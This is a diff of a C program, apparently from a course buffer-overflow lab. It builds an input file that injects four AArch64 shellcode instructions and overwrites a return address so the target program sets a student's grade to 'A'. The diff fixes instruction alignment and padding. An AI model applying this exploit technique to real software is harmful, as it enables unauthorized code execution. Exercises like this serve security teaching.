@@ -20,24 +20,33 @@ int main(void) {
     
     fp = fopen("dataA", "wb");
     
-    /* write student name */
+    /* write student name (5 bytes) */
     fwrite("Kevin", 1, 5, fp);
     
     /* write null terminator */
     fputc('\0', fp);
     
-    /* generate shellcode using miniassembler functions */
-    /* instruction 1: adr x0, 0x420044 (load grade address) */
-    instr1 = MiniAssembler_adr(0, 0x420044, 0x42005e);
+    /* write 2 alignment bytes so shellcode lands at 0x420060
+     (4-byte aligned) */
+    fputc('\0', fp);
+    fputc('\0', fp);
     
-    /* instruction 2: mov w1, #0x41 (load 'A') */
+    /* generate shellcode using miniassembler functions */
+    /* shellcode starts at name[8] = 0x420060 */
+    
+    /* instruction 1: adr x0, 0x420044 (load grade address) at 
+    0x420060 */
+    instr1 = MiniAssembler_adr(0, 0x420044, 0x420060);
+    
+    /* instruction 2: mov w1, #0x41 (load 'A') at 0x420064 */
     instr2 = MiniAssembler_mov(1, 0x41);
     
-    /* instruction 3: strb w1, [x0] (store 'A' at grade) */
+    /* instruction 3: strb w1, [x0] (store 'A' at grade) at 0x420068*/
     instr3 = MiniAssembler_strb(1, 0);
     
-    /* instruction 4: b 0x40089c (branch back to main+64) */
-    instr4 = MiniAssembler_b(0x40089c, 0x42006a);
+    /* instruction 4: b 0x40089c (branch back to main+64) at 
+    0x42006c */
+    instr4 = MiniAssembler_b(0x40089c, 0x42006c);
     
     /* write shellcode bytes (4 instructions, 16 bytes total) */
     bytes = (unsigned char *)&instr1;
@@ -60,13 +69,13 @@ int main(void) {
         fputc(bytes[i], fp);
     }
     
-    /* padding to fill remaining buf space (48 - 6 - 16 = 26 bytes) */
-    for (i = 0; i < 26; i++) {
+    /* padding to fill remaining buf space (48 - 8 - 16 = 24 bytes) */
+    for (i = 0; i < 24; i++) {
         fputc('A', fp);
     }
     
-    /* target address 0x42005e (start of shellcode) in little-endian*/
-    shellcode_addr = 0x42005e;
+    /*tar get address 0x420060 (start of shellcode) in little-endian*/
+    shellcode_addr = 0x420060;
     fwrite(&shellcode_addr, sizeof(shellcode_addr), 1, fp);
     
     /* write final newline to terminate input properly */
